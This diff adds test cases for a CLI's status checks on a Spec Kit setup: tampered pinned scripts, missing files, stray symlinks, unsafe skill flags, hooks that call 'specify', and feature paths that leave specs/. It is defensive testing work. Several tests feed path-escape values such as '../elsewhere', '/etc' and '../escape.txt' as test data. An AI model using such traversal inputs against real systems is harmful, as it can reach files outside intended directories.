+      return f.length === 1 && has(f, SK_SCRIPT, "changed") ? ok() : bad(`findings ${showF(f)}`);
+    },
+  },
+  {
+    id: "findings/run-whatever-the-row-state-and-a-deleted-skill-hides-nothing",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ...SK_ALL, [SK_SCRIPT]: "#!/bin/sh\nevil\n" });
+      rmSync(join(s.repo, SK_SPECIFY));
+      const e = k.engineOf("spec-kit");
+      if (e.state !== "missing") return bad(`state ${e.state}`);
+      if (!has(e.specKitFindings, SK_SCRIPT, "changed")) return bad(`edit hidden: ${showF(e.specKitFindings)}`);
+      if (!has(e.specKitFindings, SK_SPECIFY, "missing")) return bad(`no missing finding: ${showF(e.specKitFindings)}`);
+      const n = kitWorld(s, { owner: false });
+      return has(n.engineOf("spec-kit").specKitFindings, SK_SCRIPT) ? ok() : bad("not computed for a not-applicable row");
+    },
+  },
+  {
+    id: "findings/only-dot-specify-present-still-reports-the-missing-pinned-skills",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ".specify/memory/constitution.md": "x\n" });
+      const f = k.findings();
+      return has(f, SK_SPECIFY, "missing") && has(f, SK_SCRIPT, "missing") ? ok() : bad(`findings ${showF(f)}`);
+    },
+  },
+  {
+    id: "findings/a-core-skill-needs-exactly-one-plain-disable-model-invocation-true",
+    run: (s) => {
+      const variants = {
+        absent: skSkill("speckit-plan", ""),
+        duplicate: skSkill("speckit-plan", "disable-model-invocation: true\ndisable-model-invocation: true"),
+        quoted: skSkill("speckit-plan", "disable-model-invocation: \"true\""),
+        falsy: skSkill("speckit-plan", "disable-model-invocation: false"),
+        nested: skSkill("speckit-plan", "metadata:\n  disable-model-invocation: true"),
+        "quoted key": skSkill("speckit-plan", "\"disable-model-invocation\": true"),
+        "conflicting twin": skSkill("speckit-plan", "disable-model-invocation: true\n\"disable-model-invocation\": false"),
+        "body only": "---\nname: speckit-plan\n---\ndisable-model-invocation: true\n",
+        "no frontmatter": "disable-model-invocation: true\n",
+      };
+      for (const [name, text] of Object.entries(variants)) {
+        const k = kitWorld(s);
+        k.write({ ...SK_ALL, [SK_PLAN]: text });
+        const f = k.findings();
+        if (!has(f, SK_PLAN, "disable-model-invocation")) return bad(`${name}: ${showF(f)}`);
+      }
+      return ok();
+    },
+  },
+  {
+    id: "findings/an-extra-speckit-skill-is-checked-for-the-flag-and-named",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ...SK_ALL, ".claude/skills/speckit-extra/SKILL.md": skSkill("speckit-extra", "") });
+      const f = k.findings();
+      return has(f, "speckit-extra/SKILL.md", "disable-model-invocation") && has(f, "speckit-extra/SKILL.md", "pinned") ? ok() : bad(`findings ${showF(f)}`);
+    },
+  },
+  {
+    id: "findings/an-extra-file-or-a-symlink-under-the-pinned-folders-is-reported",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ...SK_ALL, ".specify/scripts/bash/extra.sh": "x\n" });
+      symlinkSync(join(s.repo, SK_SCRIPT), join(s.repo, ".specify/templates/link.md"));
+      const f = k.findings();
+      return has(f, ".specify/scripts/bash/extra.sh") && has(f, ".specify/templates/link.md", "symlink") ? ok() : bad(`findings ${showF(f)}`);
+    },
+  },
+  {
+    id: "findings/each-extension-preset-workflow-event-and-package-path-is-reported",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write(SK_ALL);
+      const paths = [[".specify/extensions.yml", ".specify/extensions.yml"], [".specify/extensions", ".specify/extensions/x/extension.yml"],
+        [".specify/presets", ".specify/presets/p/preset.yml"], [".specify/workflows", ".specify/workflows/w/workflow.yml"],
+        [".specify/integration-events.yml", ".specify/integration-events.yml"],
+        [".specify/integrations/packages", ".specify/integrations/packages/p/package.json"]];
+      for (const [top, p] of paths) {
+        k.write({ [p]: "x\n" });
+        const f = k.findings();
+        if (!has(f, p)) return bad(`${p}: ${showF(f)}`);
+        rmSync(join(s.repo, top), { recursive: true });
+      }
+      if (k.findings().length) return bad(`leftovers: ${showF(k.findings())}`);
+      mkdirSync(join(s.repo, ".specify/extensions"), { recursive: true });
+      return has(k.findings(), ".specify/extensions/") ? ok() : bad(`empty folder: ${showF(k.findings())}`);
+    },
+  },
+  {
+    id: "findings/a-settings-hook-calling-specify-is-reported",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ...SK_ALL, ".claude/settings.json": settingsWith("specify integration status") });
+      if (!has(k.findings(), ".claude/settings.json", "specify")) return bad(`not reported: ${showF(k.findings())}`);
+      k.write({ ".claude/settings.json": settingsWith(".specify/scripts/bash/x.sh --run") });
+      if (!has(k.findings(), ".claude/settings.json", "specify")) return bad(`.specify path hook: ${showF(k.findings())}`);
+      k.write({ ".claude/settings.json": settingsWith("echo hello") });
+      if (k.findings().length) return bad(`an unrelated hook was reported: ${showF(k.findings())}`);
+      k.write({ ".claude/settings.json": "{not json" });
+      return has(k.findings(), "could not check .claude/settings.json") ? ok() : bad(`bad json: ${showF(k.findings())}`);
+    },
+  },
+  {
+    id: "findings/a-tracked-feature-json-or-one-leaving-specs-is-reported",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ...SK_ALL, ".specify/feature.json": JSON.stringify({ feature_directory: "specs/001-x" }) });
+      if (k.findings().length) return bad(`an untracked feature.json inside specs/ was reported: ${showF(k.findings())}`);
+      gitIn2(s.repo, ["add", "-f", ".specify/feature.json"]);
+      if (!has(k.findings(), ".specify/feature.json", "tracked")) return bad(`tracked: ${showF(k.findings())}`);
+      gitIn2(s.repo, ["rm", "-q", "--cached", ".specify/feature.json"]);
+      for (const out of ["intent/2026-10-28-x", "../elsewhere", "/etc", "specs/../intent/x", "specs"]) {
+        k.write({ ".specify/feature.json": JSON.stringify({ feature_directory: out }) });
+        if (!has(k.findings(), ".specify/feature.json", "outside")) return bad(`${out}: ${showF(k.findings())}`);
+      }
+      k.write({ ".specify/feature.json": "{nope" });
+      if (!has(k.findings(), "could not check .specify/feature.json")) return bad(`bad json: ${showF(k.findings())}`);
+      rmSync(join(s.repo, ".specify/feature.json"));
+      const env = k.findings({ SPECIFY_FEATURE_DIRECTORY: "intent/x" });
+      const fine = k.findings({ SPECIFY_FEATURE_DIRECTORY: "specs/001-y" });
+      return has(env, "SPECIFY_FEATURE_DIRECTORY") && !fine.length ? ok() : bad(`env: ${showF(env)} / ${showF(fine)}`);
+    },
+  },
+  {
+    id: "findings/a-path-that-cannot-be-read-is-a-finding-never-an-error",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write(SK_ALL);
+      rmSync(join(s.repo, SK_SCRIPT));
+      mkdirSync(join(s.repo, SK_SCRIPT));
+      let r = k.run(["status", "--json"]);
+      let f = JSON.parse(r.stdout).engines.find((e) => e.id === "spec-kit").specKitFindings;
+      if (r.code !== 0 || !has(f, "could not check", SK_SCRIPT)) return bad(`folder: exit ${r.code}: ${showF(f)}`);
+      rmSync(join(s.repo, SK_SCRIPT), { recursive: true });
+      writeFileSync(join(s.repo, SK_SCRIPT), SK_PINNED[SK_SCRIPT]);
+      writeFileSync(join(s.repo, SK_PLAN), Buffer.from([0x2d, 0x2d, 0x2d, 0x0a, 0xff, 0xfe, 0x0a, 0x2d, 0x2d, 0x2d, 0x0a]));
+      f = k.findings();
+      if (!has(f, "could not check", SK_PLAN)) return bad(`non-UTF-8: ${showF(f)}`);
+      writeFileSync(join(s.repo, SK_PLAN), SK_PINNED[SK_PLAN]);
+      writeFileSync(join(s.repo, SK_SCRIPT), "x".repeat(2 * 1024 * 1024));
+      f = k.findings();
+      if (!has(f, "could not check", SK_SCRIPT)) return bad(`over the size cap: ${showF(f)}`);
+      rmSync(join(s.repo, SK_SCRIPT));
+      symlinkSync(join(s.repo, ".specify/templates/spec-template.md"), join(s.repo, SK_SCRIPT));
+      f = k.findings();
+      if (!has(f, SK_SCRIPT, "symlink")) return bad(`pinned symlink: ${showF(f)}`);
+      rmSync(join(s.repo, SK_SCRIPT));
+      writeFileSync(join(s.repo, SK_SCRIPT), SK_PINNED[SK_SCRIPT]);
+      if (typeof process.getuid === "function" && process.getuid() !== 0) {
+        chmodSync(join(s.repo, SK_SCRIPT), 0o000);
+        f = k.findings();
+        chmodSync(join(s.repo, SK_SCRIPT), 0o644);
+        if (!has(f, "could not check", SK_SCRIPT)) return bad(`unreadable: ${showF(f)}`);
+      }
+      return ok();
+    },
+  },
+  {
+    id: "findings/a-malformed-pinnedFiles-map-is-a-finding",
+    run: (s) => {
+      const k = kitWorld(s);
+      s.useRows([cliRow(), kitRow({ pinnedFiles: { [SK_SCRIPT]: "nothex", "../escape.txt": sha256("x"), "/abs": sha256("x") } })]);
+      k.write(SK_ALL);
+      const r = k.run(["status", "--json"]);
+      const f = JSON.parse(r.stdout).engines.find((e) => e.id === "spec-kit").specKitFindings;
+      return r.code === 0 && has(f, SK_SCRIPT, "could not check") && has(f, "../escape.txt", "could not check") && has(f, "/abs") ? ok() : bad(`exit ${r.code}: ${showF(f)}`);
+    },
+  },
+  {
+    id: "findings/known-unpinned-paths-in-the-row-are-not-reported",
+    run: (s) => {
+      const k = kitWorld(s);
+      s.useRows([cliRow(), kitRow({ knownUnpinned: [".specify/workflows/workflow-registry.json"] })]);
+      k.write({ ...SK_ALL, ".specify/workflows/workflow-registry.json": "{}\n" });
+      const f = k.findings();
+      if (f.length) return bad(`findings ${showF(f)}`);
+      k.write({ ".specify/workflows/other.yml": "x\n" });
+      return has(k.findings(), ".specify/workflows/other.yml") ? ok() : bad("an unlisted workflow file was not reported");
+    },
+  },
+  {
+    id: "findings/status-prints-them-in-text-form",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ...SK_ALL, [SK_SCRIPT]: "#!/bin/sh\nevil\n" });
+      const r = k.run(["status"]);
+      return r.code === 0 && r.out.includes(SK_SCRIPT) ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "findings/status-never-runs-specify-or-installs-anything",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      k.write({ ...SK_ALL, [SK_SCRIPT]: "evil\n", ".specify/extensions.yml": "x\n", [SK_PLAN]: skSkill("speckit-plan", ""),
+        ".claude/settings.json": settingsWith("specify init"), ".specify/feature.json": JSON.stringify({ feature_directory: "../x" }) });
+      for (const args of [["status", "--json"], ["status"], ["--owner", "pro-speckit", "status", "--json"]]) {
+        const r = k.run(args);
+        if (r.code !== 0) return bad(`${args.join(" ")}: exit ${r.code}: ${r.out}`);
+      }
+      if (k.ran() || k.specifyCalls().length) return bad(NOTHING);
+      const odd = s.calls("uv").filter((c) => c.argv[0] !== "tool" || c.argv[1] !== "dir");
+      return odd.length ? bad(`uv was asked to do more than find its folder: ${JSON.stringify(odd)}`) : ok();
     },
   },
 );
